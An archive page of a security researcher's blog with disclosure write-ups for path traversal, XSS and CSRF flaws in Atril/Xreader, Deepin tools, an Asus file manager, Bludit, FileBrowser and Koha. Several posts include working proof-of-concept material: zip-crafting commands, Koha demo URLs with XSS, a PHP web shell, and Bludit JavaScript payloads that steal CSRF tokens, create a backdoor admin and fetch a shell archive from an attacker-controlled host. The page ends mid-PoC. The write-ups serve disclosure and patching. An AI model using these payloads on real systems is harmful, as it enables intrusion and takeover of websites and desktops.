[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50255: Critical RCE Vulnerability in Deepin Linux’s default Archiver.](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/#respond)

## Zip Path Traversal (ZipSlip) in Deepin-Compressor

This is my 7th Published CVE.

## Description

Deepin-Compressor is the default archive manager of Deepin Linux OS. A path traversal vulnerability in deepin-compressor can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. Adding one or more “../” as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```

echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```

zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```

sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will be created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target

**Fix**: If you’re using Deepin Linux, update deepin-compressor to the latest version 5.12.21

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [Stored-XSS to Admin Account Takeover/RCE in Bludit CMS [CRITICAL]](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/)

[6th October 20232nd November 2023](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/#respond)

### Description

There’s a Stored/Persistent Cross-Site Scripting vulnerability in Bludit CMS below 3.15.0 that allows a blog Author(or an attacker with Author user privileges) to create a backdoor Administrator user and even achieve Remote Code Execution on the system. This exploit happens because of the fact that Bludit is not sanitizing any dangerous javascript that’s being injected inside page contents by the Author user, even though the cookie has “httpOnly” flag and the app has a CSRF token in place, this won’t prevent the exploitation.

The attacker (who has Author privs) can carefully craft malicious JS payload that steals Admin’s CSRF token and sends an XHR post request to “/admin/new-user” to create a new Administrator in the background, when the real Admin visits the malicious Blog/Page the JS will get executed in the background. Attacker can then log in to Bludit as the newly created Admin.

Remote Code Execution is achieved by abusing the “Remote Content” plugin. The attacker (who has Author privs) can carefully craft malicious JS payload that steals the Admin’s CSRF token and send XHR Requests in the background that enable “Remote Content” plugin and configure the plugin to download the attacker-controlled malicious zip file from the attacker’s server and also calls the webhook to trigger the plugin. When the real Admin visits the malicious Blog/Page the JS will get executed in the background, now the attacker can simply navigate to “[http://<bludit\_URL>/bl-content/workspaces/remote-content/shell.php&#8221](http://<bludit_URL>/bl-content/workspaces/remote-content/shell.php%26#8221);

![](https://user-images.githubusercontent.com/52229330/254687626-7aee1474-c147-4175-a87a-25d72e44dc2d.png)
### Steps to reproduce the problem

#### Payload1 : Creates another Admin in the background

```
<h2>Hi</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  // Steal CSRF token

const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/new-user", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&new_username=pwn&new_password=pwn123&confirm_password=pwn123&role=admin&email=admin3%40feb.com");  // creating backdoor admin user

}).catch(err => console.log(err))

</script>
```
#### Payload2 : XSS to RCE

```
<h2>Hi Admin</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  //Steal CSRF token

// Install Remote Content Plugin
const inst_plugin = new XMLHttpRequest();
inst_plugin.open("GET", "/admin/install-plugin/pluginRemoteContent", true);
inst_plugin.withCredentials = true;
inst_plugin.send()

// Shell upload plugin configue
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/configure-plugin/pluginRemoteContent", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&webhook=trigger&source=http://192.168.1.39/shell2.zip");  // creating backdoor shell (replace the http://192.168.1.39/shell2.zip with a your own link to the plugin

// Trigger the exploit by calling the Webhook
const trigger = new XMLHttpRequest();
trigger.open("GET", "/trigger", true);
trigger.withCredentials = true;
trigger.send()

}).catch(err => console.log(err))

</script>
```
#### shell.php:

```
<?php system($_GET["cmd"]); ?>
```

1. Log in as Blog Author
2. Create new content.
3. Intercept the HTTP request using any proxy tool such as BurpSuite, URL-encode the payload1 HTML/JS code, and place it inside the “content” parameter of the POST request like below.

![](https://user-images.githubusercontent.com/52229330/254681795-85759fef-0eb1-43e5-b186-6734fd4b72fb.png)

4. To verify it, Open another private browser window and log in as Admin, then visit the malicious content created by the Author, you will be able to see a new user has been created under the users list.

![](https://user-images.githubusercontent.com/52229330/254683692-06e167e7-fc71-452b-96d0-62e71c79077b.png)
#### REMOTE CODE EXECUTION:

1. In order to achieve Remote Code Execution, we need to first create a malicious plugin and serve it for further exploitation

![](https://user-images.githubusercontent.com/52229330/254685541-e03bd9b6-4161-4f27-bc5f-d52780705122.png)

2. URL-encode the payload2 from above, and make changes according to your own environment, then place it inside the “content” parameter in the HTTP request that’s intercepted

![](https://user-images.githubusercontent.com/52229330/254686113-6f94c33e-ac52-42b2-8972-295c4a1a5d76.png)

3. When the admin visits the malicious blog/page, the attacker will achieve RCE on the system.

Payload triggered:

[![](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)

Got Code Execution on target System:

[![](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)

RCE on the target!

*If you are using Bludit CMS in production update to the newer version with patches,always verify the authors, and only allow author accounts to trusted persons in your organization/team.*

# [Stored XSS in FileBrowser leads to Admin account Takeover + RCE](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/)

[15th September 202318th September 2023](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/#respond)

**CVE-2023-39612**

### Description

A Cross-Site Scripting vulnerability is discovered in FileBrowser *below v2.25.0* in which an attacker with a non-admin user account inside the FileBrowser instance can create malicious HTML & JS files, craft them in a specific way, and send the HTML file’s link to the Admin to achieve Account takeover via XSS bypassing the Content-Security-Policy.

**Proof-Of-Concept**:

// *xss.js*

```

alert(document.cookie);

```

// *xss.htm*

```

<script src="/api/raw/poc/xss.js?auth=[jwt_token of the Low Privileged user]"></script>

```

1. Create a folder named “poc” as the non-admin user.
2. Create the 2 files as above (xss.htm and xss.js) under the poc folder.
3. Craft the XSS URL as below and open it as the Admin user to verify the XSS.

```

http://your_filebrowser_ip:port//api/raw/poc/xss.htm?auth=[non-admin user's jwt token]&inline=true

```

It will trigger an alert pop-up with Admin’s Cookie.

#### Explanation

* The parameter “?auth=[non-admin token]” is added in the URL so that when the Admin opens the URL it will fetch those HTML/js files that are created by the non-admin user, otherwise FileBrowser will use the Admin’s original jwt token that’s been stored as Cookie thus leading to a “404 Not Found” Error. This is because those files are created by the non-admin user, so if the API tries to fetch them with Admin’s token it will lead to an error, the API also accepts the jwt token inside a URL get parameter “?auth=”. So, the non-admin user can deliberately supply his own JWT token in the malicious URL for a successful exploitation
* The “?inline=true” parameter is included in the crafted URL because without that parameter FileBrowser will treat the HTML file as an attachment and will download it as a file, so by having “inline=true” the HTML file will be treated as an webpage, and execute the javascript.
* Content-Security-Policy(CSP) is bypassed because FileBrowser sets CSP “default-src” to ‘self’. As the malicious JS is also loaded from the same site, it will get executed.

### Impact

This vulnerability is capable of Admin account takeover. Admin can even run system shell commands and access the filesystem, thus leading to Arbitrary Command execution.

**Fix**:

They fixed the vulnerability by adding a CSP that blocks any Javascript from executing on /api/raw endpoint.

<https://github.com/filebrowser/filebrowser/commit/b508ac3d4f7f0f75d6b49c99bdc661a6d2173f30>

Update to the latest version if you are using Filebrowser.

**Filebrowser v2.25.0 is released**

<https://github.com/filebrowser/filebrowser/releases>

# [XSS vulnerability in Koha integrated library system](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/)

[11th January 202311th January 2023](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/#respond)

This is Febin, a Security Researcher. This article is about a Cross-Site Scripting vulnerability I found in a popular library management system named Koha.

**Koha Library Software**:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha.png?w=394)

Koha is an open-source integrated library system (ILS), used world-wide by public, school and special libraries.

Koha is a web-based ILS, with a SQL database (MariaDB or MySQL preferred) back end with cataloguing data stored in MARC and accessible via Z39.50 or SRU. The user interface is very configurable and adaptable and has been translated into many languages. Koha has most of the features that would be expected in an ILS, including:

```

Various Web 2.0 facilities like tagging, comment, social sharing and RSS feeds
Union catalog facility
Customizable search
Online circulation
Bar code printing
Patron card creation
Report generation
Patron self registration form through OPAC

```

Official Site: <https://koha-community.org/>

**The Vulnerability:**

A Cross-Site Scripting (XSS) vulnerability has been found in Koha Library software that can be used by an external attacker to steal credentials, deliver malware and take over admin account for further exploitation.

The vulnerability exists in the “HTML customizations” and “News” features under “Additional tools”(/cgi-bin/koha/tools/additional-contents.pl).

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_html.png?w=1024)

An attacker can craft a URL and send it to the victim, if the victim is authenticated, then the javascript will get executed and if he’s not authenticated then Koha will prompt its login, after successful sign-in, the XSS payload will get executed. And the payload will be stored under the “HTML customizations” section i.e, whenever the victim visits that section, the XSS payload will be triggered thus making this a persistent XSS

## Proof Of Concept:

There are many demo instances of Koha software that are hosted online and are officially listed on Koha’s official website.

I have used a couple of demo Koha instances to test and prove the vulnerability.

Demo 1: intranet-demo.biblibre.com

Demo Credentials: test/test

<https://intranet-demo.biblibre.com/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss1-1.png?w=1024)

Demo 1: demo-admin.catalyst-koha.com.au

Demo Credentials: staff/staff1

<https://demo-admin.catalyst-koha.com.au//cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss2.png?w=1024)

**Fix:** Disable Javascript in HTML customizations, Sanitize user input, Use anti-CSRF token

<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>

**Thanks.**

# Posts navigation

[← Older posts](https://febin0x4e4a.wordpress.com/category/uncategorised/page/2/)

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

[febiNJ](https://febin0x4e4a.wordpress.com/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.wordpress.com_faf0ddcc_20250115_193647.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Critical CSRF in FileBrowser

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

